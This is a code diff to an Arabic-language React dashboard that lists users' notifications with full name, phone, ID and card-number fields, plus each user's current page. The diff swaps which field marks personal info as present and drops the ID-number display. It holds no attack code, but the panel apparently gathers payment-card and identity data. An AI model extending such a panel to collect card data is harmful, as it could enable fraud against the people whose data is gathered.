@@ -45,6 +45,7 @@ interface Notification {
   hasCardInfo: boolean
   currentPage: string
   createdDate: string
+  phone?: string
   notificationCount: number  
     fullName?: string
 
@@ -283,11 +284,11 @@ function UserStatus({ userId }: { userId: string }) {
                     <td className="px-4 py-3">
                       <div className="flex flex-col sm:flex-row gap-2">
                         <Badge
-                          variant={notification.hasPersonalInfo ? "default" : "destructive"}
+                          variant={notification?.fullName ? "default" : "destructive"}
                           className="rounded-md cursor-pointer hover:opacity-80 transition-opacity"
                           onClick={() => handleInfoClick(notification, "personal")}
                         >
-                          {notification.hasPersonalInfo ? "معلومات شخصية" : "لا يوجد معلومات"}
+                          {notification?.fullName ? "معلومات شخصية" : "لا يوجد معلومات"}
                         </Badge>
                         <Badge
                           variant={notification.cardNumber ? "default" : "destructive"}
@@ -355,15 +356,11 @@ function UserStatus({ userId }: { userId: string }) {
               <div className="space-y-3">
                 <div className="flex justify-between items-center p-2 bg-gray-700/50 rounded">
                   <span className="text-gray-300">الاسم الكامل:</span>
-                  <span className="font-medium">{selectedNotification.personalInfo.fullName}</span>
-                </div>
-                <div className="flex justify-between items-center p-2 bg-gray-700/50 rounded">
-                  <span className="text-gray-300">رقم الهوية:</span>
-                  <span className="font-medium">{selectedNotification.personalInfo.id}</span>
+                  <span className="font-medium">{selectedNotification?.fullName}</span>
                 </div>
                 <div className="flex justify-between items-center p-2 bg-gray-700/50 rounded">
                   <span className="text-gray-300">رقم الهاتف:</span>
-                  <span className="font-medium">{selectedNotification.personalInfo.phone}</span>
+                  <span className="font-medium">{selectedNotification?.phone}</span>
                 </div>
              
                 <div className="flex justify-between items-center p-2 bg-gray-700/50 rounded">
